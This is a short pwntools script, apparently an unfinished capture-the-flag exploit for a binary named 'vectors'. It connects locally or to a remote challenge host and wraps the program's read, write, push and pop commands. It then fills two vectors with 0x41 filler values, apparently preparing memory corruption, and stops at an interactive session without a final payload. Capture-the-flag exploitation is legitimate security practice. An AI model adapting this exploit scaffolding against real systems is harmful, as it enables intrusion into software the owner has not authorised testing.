#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./vectors"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def read(x,y):
    conn.sendline("read")
    conn.sendlineafter("Which vec? ",str(x))
    conn.sendlineafter("index> ",str(y))
    conn.recvuntil("== ")
    return int(conn.recvline(keepends=False))

def write(x,y,value):
    conn.sendline("write")
    conn.sendlineafter("Which vec? ",str(x))
    conn.sendlineafter("index> ",str(y))
    conn.sendlineafter("New value? ",str(value))

def push(x,value):
    conn.sendline("push")
    conn.sendlineafter("Which vec? ",str(x))
    conn.sendlineafter("New value? ",str(value))

def pop(x):
    conn.sendline("pop")
    conn.sendlineafter("Which vec? ",str(x))

for i in range(0x41):
    push(0,0xdeadbeef)

for i in range(0x41):
    push(1,0xdeadbeef)

debug()
conn.interactive()

